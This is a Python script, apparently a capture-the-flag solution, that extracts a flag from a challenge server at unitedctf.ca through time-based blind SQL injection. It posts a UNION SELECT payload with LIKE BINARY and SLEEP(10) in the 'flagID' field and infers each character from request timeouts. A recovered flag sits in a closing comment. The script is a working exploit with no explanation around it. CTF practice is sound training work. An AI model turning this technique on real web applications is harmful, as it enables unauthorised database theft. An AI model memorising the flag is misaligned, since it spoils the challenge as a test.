import requests, string

charset = string.printable.replace('%', '').replace('\'', '').replace('_', '')

url = 'http://challenges.unitedctf.ca:18000/challenge4.php'
flag = ''

while not flag[-2:] == '__':
	print('Current flag:', flag)
	letter_found = False
	for c in charset:
		tmpFlag = flag + c
		payload = f"' UNION SELECT id, flag FROM challenge4 WHERE (flag LIKE BINARY '{tmpFlag}%' AND SLEEP(10)); #"
		data = {'flagID': payload}
		try: 
			r = requests.post(url, data=data, timeout=1)
		except:
			letter_found = True
			flag += c 
			break

	if not letter_found:
		flag += '_'

print(flag[:-2])
# FLAG-c3qUmJTeAW_Three_Tables_for_the_Elven-admins_under_the_RDBMS_SZcIvzI3do